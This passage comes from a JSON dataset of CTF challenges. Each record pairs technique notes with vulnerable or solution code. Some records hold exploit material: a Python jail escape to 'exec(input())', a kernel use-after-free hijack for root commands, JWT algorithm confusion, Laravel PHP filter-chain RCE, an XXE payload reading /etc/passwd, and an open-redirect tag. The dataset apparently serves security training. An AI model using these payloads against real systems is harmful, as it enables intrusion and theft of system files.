        "key": "```python\ndef add(x, y):  \n   return \"getattr({},min(vars(str)))({})\".format(x, y)\n\ndef n(x):  \n   if x == 80:  \n       return \"hash((str,str))//hash(str)//hash(((),))\"  \n   if x == 39:  \n       return \"hash((str,()))//hash(((),()))\"  \n   elif x == 6:  \n       return \"hash(())//hash(str)\"  \n   elif x == 1:  \n       return \"hash(())//hash(())\"  \n   elif x > 80:  \n       return add(n(80), n(x - 80))  \n   elif x > 39:  \n       return add(n(39), n(x - 39))  \n   elif x > 6:  \n       return add(n(6), n(x - 6))  \n   else:  \n       return add(\"hash(())//hash(())\", n(x-1))\n\ndef char(x):  \n   return \"chr({})\".format(n(ord(x)))\n\ndef shell():  \n   des = \"exec(input())\"  \n   return (char(x) for x in des)\n\ndef joined_shell():  \n   init = \"str()\"  \n   for x in shell():  \n       init = add(init, x)  \n   return init\n\nprint(joined_shell())\n```"
    },
    {
        "name": "kSMS - Secure Message Storage",
        "write_up": "dataset/raw/kSMS - Secure Message Storage.md",
        "type": "pwn",
        "competition": [
            "TeamItaly/2023",
            "https://ctftime.org/event/2088/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "To bypass `HARDENED_USERCOPY` protections which restrict out-of-bounds (OOB) reads to within the boundaries of a single allocated object (slub object), the exploit must be meticulously crafted so that the read operation does not cross over the boundary of the slub object. This involves adjusting the size of the payload or the bounds of the read operation to ensure it stays within the limit of the allocated object's memory space.",
            "When dealing with a Use-After-Free (UAF) vulnerability in conjunction with Kernel Control Flow Integrity (kCFI) protections, a viable exploitation strategy is to reallocate the freed object and overwrite its function pointer with the address of a function that has an identical signature to the expected function type. This technique is necessary to call a function pointer of choice without violating kCFI's call constraints. Specifically, overwriting `work->func` with a legitimate kernel function that permits arbitrary command execution, such as `call_usermodehelper_exec_work`, enables the execution of arbitrary commands with root privileges. To successfully apply this strategy, it is crucial to craft or reuse a structure in memory that matches the expected arguments and state expected by the target function (`struct subprocess_info` in this case) to ensure the arbitrary command is executed correctly without causing undesired behavior or crashes.\n\nExample payload snippet for UAF exploit technique:\n```c\nsubprocess_info_t *info = (subprocess_info_t*)buf;  \ninfo->work.data = SOME_VALUE;  \ninfo->work.func = address_of_call_usermodehelper_exec_work;  \n// Set up `subprocess_info_t` fields appropriately\ninfo->path = address_of_command_string;  \ninfo->argv = address_of_arguments_array;  \n// Other necessary fields setup for correct execution\n```"
        ],
        "key": "```c\ntypedef struct params {  \n   void *buf;  \n   uint32_t lifetime;  \n   uint32_t len;  \n   uint32_t idx;  \n} params_t;\n\ntypedef struct work_struct {  \n\tuint64_t data;  \n\tuint64_t next, prev;  \n\tuint64_t func;  \n} work_struct_t;\n\ntypedef struct secure_message {  \n   work_struct_t work;  \n   uint32_t lifetime;  \n   uint32_t consumed;  \n   uint32_t content_size;  \n} secure_message_t;\n\ntypedef struct subprocess_info {  \n\twork_struct_t work;  \n\tuint64_t complete;  \n\tuint64_t path;  \n\tuint64_t argv;  \n\tuint64_t envp;  \n\tuint32_t wait;  \n\tuint32_t retval;  \n\tuint64_t init;  \n\tuint64_t cleanup;  \n\tuint64_t data;  \n\t/* size: 96, cachelines: 2, members: 10 */  \n} subprocess_info_t;\n\nint fd;\n\nint add_secmsg(char *buf, uint32_t len, uint32_t lifetime) {  \n   params_t args = {  \n       .buf = buf,  \n       .len = len,  \n       .lifetime = lifetime  \n   };  \n   if (ioctl(fd, CMD_ADD_MESSAGE, &args) < 0)  \n       err_exit(1, \"CMD_ADD_MESSAGE\");  \n   return args.idx;  \n}\n\nvoid read_secmsg(uint32_t idx, char *buf, uint32_t len) {  \n   params_t args = {  \n       .idx = idx,  \n       .buf = buf,  \n       .len = len  \n   };  \n   args.buf = buf;  \n   args.len = len;  \n   ioctl(fd, CMD_READ_MESSAGE, &args);  \n}\n\nvoid delete_secmsg(uint32_t idx) {  \n   params_t args = {  \n       .idx = idx  \n   };  \n   if (ioctl(fd, CMD_DELETE_MESSAGE, &args) < 0)  \n       err_exit(1, \"CMD_DELETE_MESSAGE\");  \n}\n```"
    },
    {
        "name": "L10N Poll",
        "write_up": "dataset/raw/L10N Poll.md",
        "type": "web",
        "competition": [
            "BCACTF/2021",
            "https://ctftime.org/event/1369/tasks/"
        ],
        "score": 300,
        "max_score": 450,
        "difficulty": 0.6666666666666666,
        "knowledge": [
            "In scenarios involving JSON Web Tokens (JWT) where private and public keys are used for token signing and verification, and if the application is using a vulnerable JWT library, attackers can exploit a vulnerability by signing payloads with the public key but using a symmetric algorithm (like HS256). This allows an attacker to bypass signature verification if the verification code does not enforce the correct algorithm. This tactic can be particularly effective when the application's functionality involves file access or sensitive data retrieval based on token contents.\n   - Example payload for token generation: `jwt.encode({\"language\": \"flag.txt\", \"iat\": \"1623478547\"}, publicKeyContents, algorithm=\"HS256\")`",
            "When facing web application functionalities that use regular expressions to validate user inputs (like a whitelist of characters for language codes), and there is a requirement to input values that do not match the allowed pattern (such as attempting to read files outside the intended directory), an alternative approach is needed. One effective method is to alter how the application processes and verifies inputs, such as by creating or manipulating tokens or inputs that the application trusts, thus bypassing the regular expression check. This provides a general approach to circumvent input validation mechanisms that rely on strict patterns.\n   - Unfortunately, due to the nature of the exploitation method (JWT token manipulation), a direct \"sample payload\" for bypassing a regex check does not apply. Instead, the focus is on manipulating the token to direct the application to process an unintended input value."
        ],
        "key": "```js\nrouter.get(\"/localisation-file\", async ctx => {  \n   const token = ctx.cookies.get(\"lion-token\");  \n   /** @type {string} */  \n   let language;  \n   if (token) {  \n       const payload = await new Promise((resolve, reject) => {  \n           try {  \n               jwt.verify(token, publicKey, (err, result) => err ? reject(err) : resolve(result));  \n           } catch (e) {  \n               reject(e);  \n           }  \n       });  \n       language = payload.language;  \n   } else {  \n       language = languages[Math.floor(Math.random() * languages.length)].id;  \n       ctx.cookies.set(\"lion-token\", generateToken(language));  \n   }  \n   await send(ctx, language, {root: __dirname});  \n});\n```"
    },
    {
        "name": "Labyrinth",
        "write_up": "dataset/raw/Labyrinth.md",
        "type": "pwn",
        "competition": [
            "BSidesTLV/2021",
            "https://ctftime.org/event/1403/tasks/"
        ],
        "score": 150,
        "max_score": 500,
        "difficulty": 0.3,
        "knowledge": [
            "For development challenges involving the identification of objects within images under time constraints, machine learning models, specifically pre-trained object detection models, can be utilized to automate the process of identifying and locating specific objects within the images. When the challenge requires finding objects like \"Where's Wally?\" within a tight timeframe, leveraging a pre-trained model (e.g., from the GitHub repository \"HereIsWally\") can provide an efficient solution. Such an approach involves downloading the images, processing them with the model to find the coordinates of the object of interest, and then submitting these coordinates back to the server. This method requires setting up an environment with the necessary machine learning libraries (e.g., TensorFlow) and having a script ready for automating the download, detection, and submission process.",
            "In cases where direct interaction with a remote server is necessary to download images or submit responses within development challenges, Python libraries like `pwn`, `requests`, and `shutil` can be leveraged for automating network communication, file downloads, and saving files locally. The sample script shows how to establish a connection to the remote server, parse image URLs from received data, download images using `requests.get()`, save them locally for processing, and then submit the processed information back to the server. This approach is critical when dealing with challenges that involve multiple rounds of interactions with a server, requiring both the retrieval and submission of data within a limited time frame. \n\nExample payload snippet for automating download and submission:\n```python\nconn = remote('server.address.com', port)\nimage_url  = 'https://example.com/image.jpg'\nr = requests.get(image_url, stream = True)\n# Saving downloaded image locally\nwith open(\"local_image.jpg\",'wb') as f:  \n    shutil.copyfileobj(r.raw, f)\n# Process image to find object and prepare response\nresponse = \"object_coordinates\"\nconn.sendline(bytearray(response, 'utf8'))\n```"
        ],
        "key": "```python\nconn = remote('labyrinth.ctf.bsidestlv.com',5000)  \nfor i in range(5):  \n   conn.recvuntil('https', drop=True)  \n   image_url  = 'https'+conn.recvuntil('jpg')  \n   image_path = image_url.split(\"/\")[-1]  \n   print(image_path)  \n   r = requests.get(image_url, stream = True)\n\n   # Check if the image was retrieved successfully  \n   if r.status_code == 200:  \n       # Set decode_content value to True, otherwise the downloaded image file's size will be zero.  \n       r.raw.decode_content = True\n\n       # Open a local file with wb ( write binary ) permission.  \n       with open(image_path,'wb') as f:  \n           shutil.copyfileobj(r.raw, f)\n\n       print('Image sucessfully Downloaded: ',image_path)  \n   else:  \n       print('Image Couldn\\'t be retreived')\n\n   detection_graph = tf.Graph()  \n   with detection_graph.as_default():  \n       od_graph_def = tf.GraphDef()  \n       with tf.gfile.GFile(model_path, 'rb') as fid:  \n           serialized_graph = fid.read()  \n           od_graph_def.ParseFromString(serialized_graph)  \n           tf.import_graph_def(od_graph_def, name='')\n\n   def load_image_into_numpy_array(image):  \n     (im_width, im_height) = image.size  \n     return np.array(image.getdata()).reshape(  \n         (im_height, im_width, 3)).astype(np.uint8)\n\n   label_map = label_map_util.load_labelmap('./trained_model/labels.txt')  \n   categories = label_map_util.convert_label_map_to_categories(label_map,\nmax_num_classes=1, use_display_name=True)  \n   category_index = label_map_util.create_category_index(categories)\n\n   with detection_graph.as_default():  \n     with tf.Session(graph=detection_graph) as sess:  \n       image_np = load_image_into_numpy_array(Image.open(image_path))  \n       image_tensor = detection_graph.get_tensor_by_name('image_tensor:0')  \n       boxes = detection_graph.get_tensor_by_name('detection_boxes:0')  \n       scores = detection_graph.get_tensor_by_name('detection_scores:0')  \n       classes = detection_graph.get_tensor_by_name('detection_classes:0')  \n       num_detections = detection_graph.get_tensor_by_name('num_detections:0')  \n       # Actual detection.  \n       (boxes, scores, classes, num_detections) = sess.run(  \n           [boxes, scores, classes, num_detections],  \n           feed_dict={image_tensor: np.expand_dims(image_np, axis=0)})\n\n       if scores[0][0] < 0.1:  \n           sys.exit('Wally not found :(')\n\n       width, height = Image.open(image_path).size  \n       print('Wally found')  \n       vis_util.visualize_boxes_and_labels_on_image_array(  \n           image_np,  \n           np.squeeze(boxes),  \n           np.squeeze(classes).astype(np.int32),  \n           np.squeeze(scores),  \n           category_index,  \n           use_normalized_coordinates=True,  \n           line_thickness=8)  \n       resp = '{},{}'.format(int(round(np.squeeze(boxes)[0][1]*width)), int(round(np.squeeze(boxes)[0][0]*height)))\n\n   print(conn.recvline())  \n   conn.sendline(bytearray(resp, 'utf8'))  \nprint(conn.recvrepeat(timeout=2))  \n```"
    },
    {
        "name": "lagalem",
        "write_up": "dataset/raw/lagalem.md",
        "type": "crypto",
        "competition": [
            "CodeBlue/2018/Quals",
            "https://ctftime.org/event/636/tasks/"
        ],
        "score": 246,
        "max_score": 500,
        "difficulty": 0.492,
        "knowledge": [
            "When encountering an encryption scheme where the randomness `r` used is linearly transformed and reused across multiple encryptions of the same message, we can explore correlations between different ciphertext components to deduce information about `r`. This can be especially useful if the scheme employs modular arithmetic where modular inverses exist. This principle is effective in scenarios where prime modulus is involved, allowing for the application of Fermat's Little Theorem.",
            "Given public parameters and the challenge of finding a hidden value such as `x` or `r` in an encryption algorithm, one can leverage the mathematical properties of the encryption scheme, such as the existence of multiplicative inverses and the application of Fermat's Little Theorem, to simplify and solve for the hidden values. This approach requires that the gcd(`A-1`, `p-1`) = 1, ensuring that `(A-1)^-1 mod (p-1)` exists, allowing for the decryption of the message without directly recovering `r` or `x`."
        ],
        "key": "```python\nfrom Crypto.Util.number import *\nfrom key import FLAG\n\nsize = 2048  \nrand_state = getRandomInteger(size//2)\n\ndef keygen(size):  \n q = getPrime(size)  \n k = 2  \n while True:  \n   p = q * k + 1  \n   if isPrime(p):  \n     break  \n   k += 1  \n g = 2  \n while True:  \n   if pow(g, q, p) == 1:  \n     break  \n   g += 1  \n A = getRandomInteger(size) % q  \n B = getRandomInteger(size) % q  \n x = getRandomInteger(size) % q  \n h = pow(g, x, p)  \n return (g, h, A, B, p, q), (x, )\n\ndef rand(A, B, M):  \n global rand_state  \n rand_state, ret = (A * rand_state + B) % M, rand_state  \n return ret\n\ndef encrypt(pubkey, m):  \n g, h, A, B, p, q = pubkey  \n assert 0 < m <= p  \n r = rand(A, B, q)  \n c1 = pow(g, r, p)  \n c2 = (m * pow(h, r, p)) % p  \n return (c1, c2)\n\n# pubkey, privkey = keygen(size)\n\nm = bytes_to_long(FLAG)  \nc1, c2 = encrypt(pubkey, m)  \nc1_, c2_ = encrypt(pubkey, m)\n\nprint pubkey  \nprint (c1, c2)  \nprint (c1_, c2_)  \n```"
    },
    {
        "name": "laravel",
        "write_up": "dataset/raw/laravel.md",
        "type": "web",
        "competition": [
            "N1CTF/2023",
            "https://ctftime.org/event/2062/tasks/"
        ],
        "score": 110,
        "max_score": 500,
        "difficulty": 0.22,
        "knowledge": [
            "When exploiting CVE-2021-3129 in Laravel applications, if the direct exploitation using the `phar://` protocol is blocked, an alternative method involves the use of PHP filter chains to execute code. This approach requires crafting a sophisticated filter chain that manipulates base64 encoding and various character set conversions to inject and execute PHP code via the application's vulnerable endpoint. This method is particularly useful when only specific files can be modified, such as the `public/index.php` in a Laravel application, and direct file access is restricted.\n   - Example payload structure for the `viewFile` parameter in the exploit: \n     ```php://filter/convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|...|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/var/www/html/public/index.php```",
            "Utilizing PHP filter chains for remote code execution can bypass restrictions in environments where direct use of certain protocols or functions is disabled. By encoding and decoding through a series of conversions, one can embed PHP code into a writable file within the vulnerable application. It's critical to ensure the payload leads to the execution of desired commands (e.g., displaying the contents of the flag file) while navigating through the application's constraints, such as limited file write access.\n   - Concrete example of a command to be executed by the injected PHP code (embedded within the filter chain): `system(\"cat /flag\");`"
        ],
        "key": "```php\n<?php\n\nnamespace Facade\\Ignition\\Solutions;\n\nclass MakeViewVariableOptionalSolution\n{\n    public function execute(array $parameters = [])\n    {\n        $viewFile = $parameters['viewFile'] ?? null;\n        if ($viewFile) {\n            file_put_contents($viewFile, file_get_contents($viewFile));\n        }\n    }\n}\n```\n"
    },
    {
        "name": "Leaky Logs",
        "write_up": "dataset/raw/Leaky Logs.md",
        "type": "pwn",
        "competition": [
            "MetaCTF/2021",
            "https://ctftime.org/event/1476/tasks/"
        ],
        "score": -1,
        "max_score": 550,
        "difficulty": -1,
        "knowledge": [
            "When dealing with XML injections and the goal is to extract files or sensitive information from the server, it is crucial to attempt an XXE (XML External Entity) attack. This involves manipulating the XML data being sent to the server to include a reference to an external entity that contains the path to the file you intend to read. An effective way to accomplish this is by crafting a payload that defines the external entity and includes its reference within the data that is being processed by the server.  \nExample payload:  \n```xml\n<!DOCTYPE foo [<!ENTITY xx SYSTEM \"file:///path_to_target_file\">]><params><query>&xx;</query></params>\n```",
            "In the scenario where the server responds with processed XML data, it is possible to utilize tools or scripts to automate the submission of crafted XML payloads and process responses. This approach facilitates the efficient extraction of sensitive information or flags from the server. Techniques include using scripts written in languages like Python, which leverage modules such as requests to send the malicious payload and then parse the response to retrieve the required data.  \nExample exploit script snippet:  \n```python\nimport requests\n\npayload = '''<!DOCTYPE foo [<!ENTITY xx SYSTEM \"file:///etc/passwd\">]><params><query>&xx;</query></params>'''\nresponse = requests.post(\"http://target.com/api/endpoint\", data=payload, headers={\"Content-Type\": \"text/xml\"})\nprint(response.content)\n```"
        ],
        "key": "```js\nfunction search(query) {  \n    console.log(query);\n\n    let doc = document.implementation.createDocument(\"\", \"\", null);  \n    let elem = doc.createElement(\"params\");  \n    let queryparam = doc.createElement(\"query\");  \n    queryparam.innerHTML = query;  \n    elem.appendChild(queryparam);  \n    doc.appendChild(elem);  \n    const serializer = new XMLSerializer();  \n    const xmlStr = serializer.serializeToString(doc);  \n    console.log(xmlStr);\n\n    fetch(\"/api/event_log\", {  \n            method: \"POST\",  \n            headers: {  \n                'Content-Type': 'text/xml'  \n            },  \n            body: xmlStr  \n        })  \n        .then(data => data.text())  \n        .then(str => new window.DOMParser().parseFromString(str, \"text/xml\"))  \n        .then(data => {  \n            const tableBody = document.getElementById(\"table-body\");  \n            while (tableBody.firstChild) {  \n                tableBody.firstChild.remove()  \n            }\n\n            for (e of data.getElementsByTagName(\"event\")) {  \n                const row = tableBody.insertRow(-1);  \n                row.insertCell(-1).innerHTML = e.getAttribute(\"date\");  \n                row.insertCell(-1).innerHTML = e.innerHTML;  \n                let symbol = \"cart\";  \n                if (e.innerHTML.includes(\"finished\")) {  \n                    symbol = \"user\";  \n                } else if (e.innerHTML.includes(\"resumed\")) {  \n                    symbol = \"cog\";  \n                }  \n                row.insertCell(-1).innerHTML = \"<span></span>\";  \n            }  \n        });  \n}\n```"
    },
    {
        "name": "leakynote v3",
        "write_up": "dataset/raw/leakynote v3.md",
        "type": "web",
        "competition": [
            "TeamItaly/2023",
            "https://ctftime.org/event/2088/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "An open redirect vulnerability can be identified and exploited using a meta refresh HTML tag when a web application does not properly validate user input that is embedded in web pages, enabling attackers to redirect a victim to arbitrary URLs. Specifically, if the application employs security directives like `navigate-to` that are experimental and not widely supported, inserting a meta redirect tag in user-controlled inputs can lead to successful redirections. Example payload: `<meta http-equiv=\"refresh\" content=\"0; URL='http://malicious.site'\" />`",
            "An information leakage technique utilizes the behavior of browsers not storing 404-error pages in history and the restrictions on the `:visited` CSS pseudo-class to infer whether a link was visited by a bot. This is achieved by creating conditions that apply specific styles to visited links and using JavaScript to measure the rendering performance or applying complex CSS repaint operations to discern between visited and non-visited links. This method allows one to deduce the existence of specific paths or data (such as valid note identifiers) based on the differential rendering performance. Although direct access to the `:visited` state is restricted for privacy reasons, indirect measurements can reveal this state."
        ],
        "key": "```php\n<div id=\"contents\"><?php echo $post[\"contents\"]; ?></div> \n```"
    },
    {
        "name": "learning-without-errors",
        "write_up": "dataset/raw/learning-without-errors.md",
        "type": "crypto",
        "competition": [
            "DiceCTF/2022",
            "https://ctftime.org/event/1541/tasks/"
        ],
        "score": 396,
        "max_score": 500,
        "difficulty": 0.792,
        "knowledge": [
            "In challenges related to Ring Learning With Errors (RLWE) cryptosystem vulnerabilities, specifically CKKS scheme, an effective attack vector is exploiting the leakage of the secret error during decryption. Since CKKS decrypts to `m + e`, one can algebraically manipulate encrypted and decrypted pairs to extract the secret key, especially if `c_0` (a part of the encrypted message pair) is invertible. This method relies on the basic algebraic property that `s = (c_1 - (m + e)) * c_0^{-1}` where `s` is the secret key.",
            "When faced with the problem of inversion in a ring with a power-of-two modulus like `Zmod(2^100)`, which complicates direct inversion due to its properties, it's advisable to shift the computation to a domain where inversion is more tractable. This can be either solving in `ZMod(2)` for a higher chance of invertibility or employing advanced techniques like solving over the p-adics. The choice of domain or technique greatly depends on the specific parameters and structures of the cryptographic challenge being addressed."
        ],
        "key": "```python\nq = 1 << 100  \nN = 10  \nRbase.<x> = PolynomialRing(Zmod(q))  \nR.<x> = Rbase.quotient(x^N + 1)  \n```"
    },
    {
        "name": "LED",
        "write_up": "dataset/raw/LED.md",
        "type": "crypto",
        "competition": [
            "CodeBlue/2018/Quals",
            "https://ctftime.org/event/636/tasks/"
        ],
        "score": 315,
        "max_score": 500,
        "difficulty": 0.63,
        "knowledge": [
            "In cryptographic challenges involving encryption algorithms with a stepwise transformation process, if each step's impact on the final output is isolated and understood, it allows for systematic brute-forcing of key portions. Specifically, when an encryption function's operation can be dissected into stages where specific subsets of the key affect distinct subsets of the output independently, and one of the stages involves a predictable or non-encrypting manipulation such as permutation, identifying the relation between key subsets and their corresponding output subsets enables targeted brute-forcing. This approach is especially viable when the complexity added by one of the function's final steps (like a permutation) does not alter the actual encryption but merely rearranges the output, as this rearrangement can be decoded or accounted for separately.",
            "In encryption challenges where the encryption process involves multiple rounds of transformation and part of the encryption key is known or can be brute-forced, it's effective to use the partial key to reverse intermediate stages of the encryption process. This allows for the discovery of internal states or permutations used within the function, facilitating the brute-forcing of the remaining parts of the key. When an algorithm applies transformations in rounds, knowledge of the outcomes of specific rounds (like knowing the effect of all rounds except the last) can be leveraged to strip away the algorithm's complexity layer by layer, thereby simplifying the brute-forcing of any remaining unknown key portions or internal states."
        ],
        "key": "```python\ndef Lazy_LED_enc(password, key, rounds):\n    # Initial setup and transformations\n    state = initial_transformation(password, key)\n    \n    for _ in range(rounds):\n        # Perform some operations on the state\n        state = some_operations(state, key)\n    \n    # Vulnerable part: random permutation\n    ret2 = \"\"\n    for i in range(16):\n        ret2 += state[sbox_lazy[i]]  # Now it's safe!\n    \n    return ret2\n\ndef initial_transformation(password, key):\n    # Transform the password and key into an initial state\n    # This is a placeholder for the actual transformation logic\n    return password + key\n\ndef some_operations(state, key):\n    # Perform operations on the state using the key\n    # This is a placeholder for the actual operations\n    return state\n```"
    },
    {
        "name": "Left Foot Two Stomps",
        "write_up": "dataset/raw/Left Foot Two Stomps.md",
        "type": "crypto",
        "competition": [
            "DawgCTF/2020",
            "https://ctftime.org/event/1030/tasks/"
        ],
        "score": 250,
        "max_score": 500,
        "difficulty": 0.5,
        "knowledge": [
            "When confronted with RSA encryption & a small `n`, factorize `n` to find `p` and `q`. Then, compute the modular inverse of `e` modulo `(p-1)*(q-1)` to find `d`, the decryption key. This can decrypt the ciphertext when given in an array, applying the formula `plaintext[i] = pow(ciphertext[i], d, n)` for each element.\n   - Example code snippet for decryption with small `n`:\n     ```python\n     def egcd(a, b):  \n         if a == 0:  \n             return (b, 0, 1)  \n         else:  \n             g, y, x = egcd(b % a, a)  \n             return (g, x - (b // a) * y, y)\n     \n     def modinv(a, m):  \n         g, x, y = egcd(a, m)  \n         if g != 1:  \n             raise Exception('modular inverse does not exist')  \n         else:  \n             return x % m\n     \n     p = # factor of n\n     q = n // p\n     e = # public exponent\n     d = modinv(e, (p-1)*(q-1))\n     plaintext = [pow(a, d, n) for a in cipher] # cipher is the array of ciphertext integers\n     ```",
            "Encoded messages may utilize multiple layers of encryption or encoding, requiring a step-by-step decoding approach. Recognize the pattern or hints in decrypted messages to apply the correct decryption or decoding method successively, using tools like Vigenere cipher decoders, Base64 decoders, and ROT cipher decoders. Identifying the correct sequence to apply these methods may be necessary to completely decode the original plaintext.\n   - Sequence example from the challenge:\n     1. Decrypt RSA encrypted message to get a string that appears to be Vigenere cipher encrypted.\n     2. Use the provided key to decode the Vigenere cipher.\n     3. Decode the result from Base64.\n     4. Apply ROT cipher decoding to the Base64 decoded message to get the final plaintext."
        ],
        "key": "```python  \nn = 960242069  \ne = 347  \ncipher =\n[346046109,295161774,616062960,790750242,259677897,945606673,321883599,625021022,731220302,556994500,118512782,843462311,321883599,202294479,725148418,725148418,636253020,70699533,475241234,530533280,860892522,530533280,657690757,110489031,271790171,221180981,221180981,278854535,202294479,231979042,725148418,787183046,346046109,657690757,530533280,770057231,271790171,584652061,405302860,137112544,137112544,851931432,118512782,683778547,616062960,508395428,271790171,185391473,923405109,227720616,563542899,770121847,185391473,546341739,851931432,657690757,851931432,284629213,289862692,788320338,770057231,770121847]\n\nfor p in range(3,n,2):  \n   if n % p == 0:  \n       break  \nq = n // p  \nprint(p, q)\n\ndef egcd(a, b):  \n   if a == 0:  \n       return (b, 0, 1)  \n   else:  \n       g, y, x = egcd(b % a, a)  \n       return (g, x - (b // a) * y, y)\n\ndef modinv(a, m):  \n   g, x, y = egcd(a, m)  \n   if g != 1:  \n       raise Exception('modular inverse does not exist')  \n   else:  \n       return x % m\n\nd = modinv(e, (p-1)*(q-1))  \nprint(d)\n\ndef pow(a, x, n):  \n   if x == 0:  \n       return 1  \n   if x == 1:  \n       return a%n  \n   s = pow(a,x//2,n)  \n   s *= s  \n   if x%2 == 1:  \n       s *= a  \n   return s%n\n\nplaintext = [pow(a, d, n) for a in cipher]  \nprint(\"\".join([chr(c) for c in plaintext]))  \n```"
    },
    {
        "name": "Lenore Blum",
        "write_up": "dataset/raw/Lenore Blum.md",
        "type": "crypto",
        "competition": [
            "CyberHeroines/2023",
            "https://ctftime.org/event/2054/tasks/"
        ],
        "score": 300,
        "max_score": 400,
        "difficulty": 0.75,
        "knowledge": [
            "When faced with challenges involving the Blum Blum Shub (BBS) pseudorandom number generator, one can reverse-engineer the algorithm if the seed is known and if the parameters p and q used in the algorithm can be determined or inferred from given information. Specifically, if p and q must be primes congruent to 3 mod 4, and the seed is manipulated by a known factor (e.g., multiplied by a fixed value), these values can be reverse-engineered to predict the next numbers generated by the BBS algorithm. This approach is effective when the challenge involves predicting or replicating numbers produced by the BBS algorithm based on an initial seed provided by the challenge.",
            "In challenges where prime numbers are generated or used (especially in cryptographic contexts like the BBS algorithm or other prime-dependent algorithms), implementing or extracting functions to find prime numbers meeting specific criteria (e.g., congruent to 3 mod 4) and to verify if a number is prime can be pivotal. These functions are universally applicable across a variety of CTF crypto challenges involving prime numbers. Additionally, being able to implement or adapt these prime-related functions dynamically within scripts allows for automation and efficient solving of challenges that involve calculating or predicting values based on prime numbers. \n\nExample of calculating a prime number congruent to 3 mod 4:\n```python\ndef find_prime_congruent_to_3_mod_4(param):  \n   local_10 = param  \n   while True:  \n       cVar1 = is_prime(local_10)  \n       if cVar1 and (local_10 & 3) == 3:  \n           break  \n       local_10 += 1  \n   return local_10\n```"
        ],
        "key": "```python\ndef find_prime_congruent_to_3_mod_4(param):  \n   local_10 = param  \n   while True:  \n       cVar1 = is_prime(local_10)  \n       if cVar1 and (local_10 & 3) == 3:  \n           break  \n       local_10 += 1  \n   return local_10\n\ndef bbs(param1, param2, param3):  \n   local_10 = (param3 * param3) % (param1 * param2)  \n   local_18 = 0  \n   for local_1c in range(0x3f):  \n       local_10 = (local_10 * local_10) % (param1 * param2)  \n       local_18 |= (local_10 & 1) << (local_1c & 0x3f)  \n   return local_18\n\ndef is_prime(param):  \n   if param < 2:  \n       return 0  \n   elif param < 4:  \n       return 1  \n   elif (param & 1) == 0 or param % 3 == 0:  \n       return 0  \n   else:  \n       for local_10 in range(5, int(param ** 0.5) + 1, 6):  \n           if param % local_10 == 0 or param % (local_10 + 2) == 0:  \n               return 0  \n       return 1\n```"
    },
    {
        "name": "Less Effort Required",
        "write_up": "dataset/raw/Less Effort Required.md",
        "type": "crypto",
        "competition": [
            "UMDCTF/2020",
            "https://ctftime.org/event/1040/tasks/"
        ],
        "score": 300,
        "max_score": 800,
        "difficulty": 0.375,
        "knowledge": [
            "When confronted with RSA encryption where the public exponent 'e' is notably small, an effective approach involves directly calculating the e-th root of the ciphertext. This technique bypasses the need for private key information when 'e' and the ciphertext are suitably small, hence simplifying the decryption process. To accomplish this, one can utilize libraries like gmpy in Python, which supports the computation of exact roots for integers.\n\nExample payload:\n```python\nimport gmpy\nc = 40030182544273856015788999062464973403472186630147528555052489762516210821795493031619376345647069575950526306492922573846162431037037824967074058132327917359025595463728944947118480605422897682821384491771926743103021286982319660969379132360886299787840185308892024028684314873509707776\ne = 5\nm = gmpy.root(c,e)[0]\n```",
            "To transform an integer back into its original byte form after decryption, Python's `Crypto.Util.number` library provides the `long_to_bytes` method. This conversion is crucial for RSA encryption challenges where plaintext messages are converted to integers for encryption and must be reverted to interpret the decrypted message accurately.\n\nExample usage:\n```python\nfrom Crypto.Util.number import long_to_bytes\n# Assuming 'm' is the decrypted integer message\nflag = long_to_bytes(m)\nprint(flag)\n```"
        ],
        "key": "```python\nfrom Crypto.PublicKey import RSA\n\ndef encrypt_flag(plaintext_bytes):  \n   RSAkey = RSA.generate(1024)  \n   n = getattr(RSAkey.key, 'n')  \n   e = 5  \n   plaintext_bytes += b'\\x00'  \n   plaintext = int.from_bytes(plaintext_bytes, 'big')  \n   ciphertext = pow(plaintext, e, n)  \n   open('ciphertext', 'w').write(str(ciphertext))  \n   public_key = str(n) + \":\" + str(e)  \n   open('public_key', 'w').write(public_key)  \n```"
    },
    {
        "name": "LessEQualmore",
        "write_up": "dataset/raw/LessEQualmore.md",
        "type": "pwn",
        "competition": [
            "HITCON/2023/Quals",
            "https://ctftime.org/event/2019/tasks/"
        ],
        "score": 248,
        "max_score": 500,
        "difficulty": 0.496,
        "knowledge": [
            "When tackling challenges involving a subleq virtual machine or similar esoteric programming environments that perform computations or verifications based on user input, it can be highly effective to use taint analysis combined with symbolic execution. This approach enables the identification of input-dependent branches and computation paths. By representing input as symbolic variables and tracing their influence through the program's logic, one can pinpoint which operations are critical for determining the correctness of the input. This is particularly useful in environments where the program self-modifies or where the logic is opaque.",
            "In scenarios where a program performs comparisons that are fundamental to its control flow (e.g., verifying a password or flag), optimizing the search for the correct input can often hinge on the assumption that comparisons may involve some constant or fixed pattern. This means that rather than looking for arbitrary relations between input characters, it may be more efficient to search for equations where input characters are compared either to each other with some offset or directly against constant values. This assumption can significantly narrow down the search space when combined with symbolic execution and taint analysis, making it feasible to identify the correct input even when dealing with a large number of possibilities or a complex program structure."
        ],
        "key": "```c\n// Possible vulnerable code snippet based on the context of a subleq VM\n#include <stdio.h>\n#include <string.h>\n\n#define MEMORY_SIZE 50000\n\nint memory[MEMORY_SIZE];\nint input[100];\n\nvoid subleq_vm() {\n    int pc = 0;\n    while (pc < MEMORY_SIZE) {\n        int a = memory[pc];\n        int b = memory[pc + 1];\n        int c = memory[pc + 2];\n\n        memory[b] -= memory[a];\n        if (memory[b] <= 0) {\n            pc = c;\n        } else {\n            pc += 3;\n        }\n    }\n}\n\nvoid get_input() {\n    printf(\"Enter flag: \");\n    fgets((char*)input, sizeof(input), stdin);\n}\n\nint main() {\n    // Load the challenge program into memory\n    // This is a placeholder for the actual subleq program\n    // memory[...] = ...;\n\n    get_input();\n    subleq_vm();\n\n    return 0;\n}\n```"
    },
    {
        "name": "Life on Mars",
        "write_up": "dataset/raw/Life on Mars.md",
        "type": "web",
        "competition": [
            "b01lers/2020",
            "https://ctftime.org/event/974/tasks/"
        ],
        "score": 100,
        "max_score": 300,
        "difficulty": 0.3333333333333333,
        "knowledge": [
